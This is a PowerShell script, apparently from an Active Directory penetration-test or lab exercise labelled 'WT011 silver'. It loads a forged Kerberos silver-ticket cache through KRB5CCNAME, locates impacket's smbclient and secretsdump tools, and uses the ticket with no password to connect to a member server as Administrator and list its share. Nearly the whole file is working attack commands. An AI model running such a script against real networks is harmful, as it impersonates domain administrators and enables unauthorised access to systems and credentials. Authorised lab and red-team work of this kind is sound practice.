# WT011 silver — impacket smbclient (file-based, no quoting hell)
$ErrorActionPreference = 'Continue'
$out = 'C:\Tools\ADTools'
$env:KRB5CCNAME = "$out\wt011-silver.ccache"

python -c "import impacket; print('IMPACKET', impacket.__version__)" 2>&1 | ForEach-Object { Write-Output "VER|$_" }

# Find impacket smbclient entry point
$pyScripts = "$env:LOCALAPPDATA\Programs\Python\Python312\Scripts"
Get-ChildItem $pyScripts -Filter '*smbclient*' -ErrorAction SilentlyContinue | ForEach-Object { Write-Output "SCRIPT|$($_.FullName)" }
Get-ChildItem $pyScripts -Filter '*secretsdump*' -ErrorAction SilentlyContinue | ForEach-Object { Write-Output "SCRIPT2|$($_.FullName)" }

# Test module invocation writes to file
$ps = @"
import sys
sys.path.insert(0, r'$pyScripts')
"@
# Try console script directly
$smbCli = Get-ChildItem $pyScripts -Filter 'smbclient*' -ErrorAction SilentlyContinue | Select-Object -First 1
if ($smbCli) {
    & $smbCli.FullName -k -no-pass 'child.cadre.local/Administrator@mbr01.child.cadre.local' -c 'ls' 2>&1 | Select-Object -First 20 | ForEach-Object { Write-Output "SMBEXE|$_" }
} else {
    Write-Output 'NO_SMBCLIENT_SCRIPT'
}

# Also try python -m with output capture
python -m impacket.examples.smbclient -k -no-pass 'child.cadre.local/Administrator@mbr01.child.cadre.local' -c 'ls' 2>&1 | Select-Object -First 20 | ForEach-Object { Write-Output "SMBMOD|$_" }
Write-Output 'WT011_SMB2_DONE'
